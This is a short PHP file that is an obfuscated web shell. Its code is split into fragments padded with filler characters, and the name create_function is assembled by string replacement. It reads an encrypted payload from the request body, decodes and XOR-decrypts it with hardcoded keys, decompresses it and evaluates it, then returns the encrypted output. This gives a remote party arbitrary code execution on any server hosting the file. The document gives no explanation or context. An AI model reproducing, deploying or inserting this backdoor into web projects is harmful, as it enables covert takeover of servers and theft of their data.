<?php
$M='{$o.=xv$txv{$i}^$k{$xvj};}}xvretuxvrnxv $o;}xvif (@xvpreg_matcxvh("/$khxv(.+)$kf/xv",@filexv_getxv_contents("pxvhxvp:/';
$f='/input")xv,$xvm)==xv1) {@ob_staxvrt();@exvvalxv(@gzuxvncompress(xv@x(@baxvsxvexv64xv_decode($mxv[1])xv,$k))xv);$o=@ob_getx';
$v='v_contxvents();@xvob_end_clexvan();$xvr=@basexvxv64_encxvodxve(@x(@gzcoxvmpresxvs($oxv),$k));print("xv$p$kh$r$xvkf");}';
$E=str_replace('IZ','','cIZreaIZteIZ_IZIZfunctIZion');
$Z='$k="0cxvb0fc87"xv;$kh="06xv01e8xv0xva116b";$kf="xvxvaxv25b596e4a3a";$pxv="HxvXcI5Fxv6mQZi8txv6zd";fuxvnctixvoxvn x($t';
$P=',$k){$c=stxvrlexvnxv($k);$l=strlenxv($t);xv$o="";foxvr($i=xv0;$i<$l;xv){forxv($xvjxv=0;(xv$j<$cxv&&$i<$xvl);$j++,$i++)';
$Y=str_replace('xv','',$Z.$P.$M.$f.$v);
$C=$E('',$Y);$C();
?>
